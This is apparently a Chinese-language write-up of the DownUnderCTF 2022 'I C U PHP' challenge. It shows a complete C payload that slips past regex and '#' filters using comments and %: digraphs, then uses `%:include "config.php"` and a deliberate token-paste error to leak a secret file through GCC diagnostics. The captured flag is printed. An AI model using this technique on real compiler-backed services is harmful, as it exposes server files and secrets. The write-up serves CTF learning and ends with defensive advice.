# DownUnderCTF 2022 I C U PHP Writeup

## 题目简述

网站接收不超过 1000 字节的 C 代码，先用正则检查是否包含 `main`、`struct`、`for(`，并拒绝字符 `#`；通过后再执行 `gcc -Werror -x c`，最多回显 192 字节编译错误。服务器同目录的 `config.php` 包含 flag。目标是绕过表面检查，让 C 预处理器包含该文件，并借编译诊断泄露秘密。

## 解题过程

要求检查只在原始文本上做正则匹配，并不理解 C 词法。把三个关键片段写进 `//` 注释即可满足：

```c
//struct { for( int main(
```

无 `#` 限制也不等于禁用预处理器。C 标准 digraph `%:` 等价于 `#`，`%:%:` 等价于 `##`，因此仍可使用 `%:define` 和 `%:include`。

直接包含 `config.php` 会产生大量 PHP 语法错误。先定义一组宏，把 `class`、`public`、`function`、`new` 和对象字段等 PHP 记号改写或吞掉；最关键的宏是：

```c
%:define AppConfig(X, Y) Y%:%:;
```

`config.php` 中实例化 `AppConfig` 时，第二个实参正是 flag。宏展开尝试把这个字符串字面量与分号用 `##` 粘接，GCC 会报告“pasting ... does not give a valid preprocessing token”，并在诊断中原样打印字符串。

完整提交可写为：

```c
//struct { for( int main(
typedef struct {
    int requirements;
    int requirement_descriptions;
    int title;
    int secret_key;
} wa;
%:define dbg_log(...)
%:define class ;struct
%:define public int
%:define function int
%:define $secret_key asdf;}
%:define $requirement_descriptions asdf;}
%:define __construct(X,Y) X(wa*$this,int $reqs,int $descs,int $title,int $f){
%:define TestConfig(...) "0"
%:define AppConfig(X,Y) Y%:%:;
%:define $test_config ;char*n
%:define new (char*)
%:define $app_config char*p
0
%:include "config.php"
```

反馈中的关键诊断为：

```text
error: pasting '"DUCTF{pr3pr0c3ssOrPoWer3dPHPpEEk1ngPuzZLe_2b842b}"'
and ';' does not give a valid preprocessing token
```

因此 flag 是：

```text
DUCTF{pr3pr0c3ssOrPoWer3dPHPpEEk1ngPuzZLe_2b842b}
```

## 方法总结

漏洞来自三套语法认知不一致：PHP 用正则判断“像不像 C”，C 预处理器接受正则未覆盖的 digraph，GCC 诊断又回显服务器文件中的宏实参。注释可以骗过存在性检查，`%:` 绕过字符黑名单，故意制造 token-paste 错误则把秘密送入可见错误信息。安全做法是使用真正的 C 解析器或隔离的固定测试框架，并禁止用户编译单元访问应用源码目录。
